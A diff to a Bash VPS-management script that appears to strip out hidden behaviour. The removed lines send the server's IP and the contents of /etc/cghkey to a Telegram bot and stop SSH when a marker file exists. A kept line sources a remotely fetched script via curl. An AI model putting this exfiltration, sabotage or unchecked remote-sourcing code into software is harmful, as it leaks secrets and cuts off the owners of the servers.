@@ -4,29 +4,10 @@
 [[ -e /bin/ejecutar/msg ]] && source /bin/ejecutar/msg || source <(curl -sL https://raw.githubusercontent.com/karl1999x/ChumoGH/main/styles/styles.cpp)
 
 _mssBOT () {
-xyz=$(curl -sSL "https://www.dropbox.com/s/jzkd6fzey2u0m0g/token.sh")
-[[ "$(cat -n /etc/adm-lite/menu_credito | wc -l)" -ge "2" ]] && ID="$(cat /etc/adm-lite/menu_credito |tail -1)" || ID="$(echo $xyz| awk '{print $2}')"
-TOKEN="$(echo $xyz| awk '{print $1}')"
-urlBOT="https://api.telegram.org/bot$TOKEN/sendMessage"
-data=$1
-MENSAJE="${TTini}${m3ssg}MSG RECIVIDO${m3ssg}${TTfin}\n"
-			MENSAJE+="$(msg -br)\n"
-			MENSAJE+=" $data \n"
-			MENSAJE+=" IP : $(wget -qO- ifconfig.me) \n"
-			MENSAJE+="$(msg -br)\n"
-			MENSAJE+=" KEY : $(cat /etc/cghkey)\n"
-			MENSAJE+="$(msg -br)\n"
-			MENSAJE+=" HORA : $(printf '%(%D-%H:%M:%S)T')\n"
-			MENSAJE+="       ${rUlq} Bot generador de key ${rUlq}\n"
-			MENSAJE+="           ${pUn5A} By @ChumoGH ${pUn5A} \n"
-			MENSAJE+="$(msg -br)\n"	
-curl -s --max-time 10 -d "chat_id=$ID&disable_web_page_preview=1&text=$(echo -e "$MENSAJE")" $urlBOT &>/dev/null 	
+    return 0
 }
 
-
-
 rootpass () {
-[[ -e /etc/version_instalacion ]] && service ssh stop && exit
 clear
 [[ "$(whoami)" != "root" ]] && {
 	clear
@@ -34,7 +15,7 @@ clear
 	exit
 }
 unset yesno
-[[ -e /root/name ]] && figlet -p -f smslant < /root/name | lolcat || echo -e "\033[7;49;35m    ${TTini} New ChumoGH${TTcent}VPS  ${TTfin}      "
+[[ -e /root/name ]] && figlet -f smslant < /root/name 2>/dev/null | lolcat 2>/dev/null || echo -e "\033[7;49;35m    ${TTini} New ChumoGH${TTcent}VPS  ${TTfin}      "
 msg -bar3
 [[ $(uname -m 2> /dev/null) != x86_64 ]] && {
 msg -bar3
